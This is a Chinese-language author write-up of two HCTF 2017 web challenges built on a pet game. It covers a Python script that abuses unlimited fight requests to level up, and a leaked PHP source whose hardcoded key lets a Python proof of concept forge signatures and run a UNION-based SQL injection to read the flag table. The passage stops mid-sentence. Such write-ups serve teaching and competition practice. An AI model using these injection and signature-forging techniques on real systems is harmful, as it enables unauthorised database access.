# poker2

------

这次想以游戏安全出一些题目，但是又担心出的太难，大家没做过类似的游戏漏洞挖掘(其实是为了偷懒)，就出了一道战斗频率没有限制的刷级漏洞。这是一个去掉充值功能以外完整的游戏，我去掉了后台对于加速器的检测机制。
&nbsp;&nbsp;&nbsp;&nbsp;提示给的很明显，在flag.php里提示了
```
getFlag when you are at level 100!!!
```
升到一百级就可以拿到flag，但是比赛时间的48个小时正常情况下不吃不喝也是升不到100级的，ctf本来就是一个hack game，所以需要分析他的游戏机制。这个版本的poker2没有战斗频率限制，可以高速无限战斗，脚本很简单，但是还需要分析游戏的细节。众多野怪地图里有一个叫圣诞小屋的挂机地图，伤害低经验高，写好挂机脚本还是很简单的。
```
import requests
import re
from time import sleep
host = "petgame.2017.hctf.io"

headers = {
    "Cookie":"PHPSESSID=c4gn8hav06nsv43bo65tlfkto3"
}
def getFight(host, headers):
    url = "http://"+host+"/function/Fight_Mod.php?p=37&bid=5226&rd=0.5365947475076844"
    req = requests.get(url = url, headers = headers)
    html = req.content
    gid = re.findall("gg=\[.*,(.*)\]",html)
    if len(gid)>0:
        gid = gid[0]
        attack(gid, 4, host, headers)
    else:
        return False

def attack(gid, times, host, headers):
    url = "http://"+host+"/function/FightGate.php?id=1&g="+str(gid)+"&checkwg=checked&rd=0.34966725314993186"
    for i in xrange(0,times-1):
        req = requests.get(url = url, headers = headers)
        html = req.content
        print html

while True:
    getFight(host,headers)
#    sleep(0.1)

#attack(86,url,headers)


```
其实还有其他解法，就是在poker-poker一题中找到注入点，如果有一百级的玩家的密码是弱口令(md5可查)则可以进入其他人账号获得flag。我特意把poker2一题放在第二层，poker-poker在第三层，但是还是有人找到了非预期的注入点(注册处)，提前获取了别人的session，在我删除一百级账号前获得flag。

#poker-poker
这题就比较难受了，看了大家传上来的wp，没有一份是预期解。由于游戏程序比较多，我也没全部看过，就找了一处隐蔽的有回显注入点，但是有一些前置条件。
题目提示是pspt，访问发现跳转到pspt/并且状态403，说明存在pspt目录。
pspt目录下存在robots.txt。
```
Disallow: /pspt/inf/queryUserRole.php
Sitemap: http://domain.com/sitemap.xml
```
直接访问/pspt/inf/queryUserRole.php提示error1。该目录下存在.bak文件，泄漏了源码。
```
<?php
require_once(dirname(dirname(dirname(__FILE__))).'/config/config.game.php');
if (empty($_GET['user_account']) || empty($_GET['valid_date']) || empty($_GET['sign'])) {
    die('error1');
}

$time = time();
if ($_GET['valid_date'] <= $time) {
    die('error2');
}

$encryKey = '7sl+kb9adDAc7gLuv31MeEFPBMJZdRZyAx9eEmXSTui4423hgGfXF1pyM';
$flag = md5($_GET['user_account'].$_GET['valid_date'].$encryKey);
if ($flag != $_GET['sign']) {
    die('error3');
}

$arr = $_pm['mysql'] -> getOneRecord("SELECT id,nickname FROM player WHERE name = '{$_GET['user_account']}'");

if (!is_array($arr)) {
    die('error4');
}

$str = $arr['id'].'&'.$arr['nickname'];
$newstr = iconv('utf8','utf-8',$str);
echo $newstr;
unset($time,$arr,$str);
?>
```
此处泄漏了encryKey，只要有这个encryKey，我们可以根据源码写出注入payload。
poc:
```
import requests
import time
import hashlib
import urllib2

def getMd5(data):
    data = str(data)
    t = hashlib.md5()
    t.update(data)
    return t.hexdigest()

def hack(payload="admin"):
    user_account = urllib2.quote(payload)
    valid_date = int(time.time())+10000
    sign = getSign(user_account, valid_date)
    url = "http://petgame.2017.hctf.io/pspt/inf/queryUserRole.php?user_account="+str(user_account)+"&valid_date="+str(valid_date)+"&sign="+sign
    req = requests.get(url = url)
    print req.content

def getSign(user_account, valid_date):
    user_account = urllib2.unquote(user_account)
    encryKey = '7sl+kb9adDAc7gLuv31MeEFPBMJZdRZyAx9eEmXSTui4423hgGfXF1pyM'
    sign = getMd5(str(user_account) + str(valid_date) + encryKey)
    return sign

hack("adminss' union all select 111,flag from hctf.flag2#")
```
flag就在hctf库里的hctf2表里。
而大家找到的其他注入点


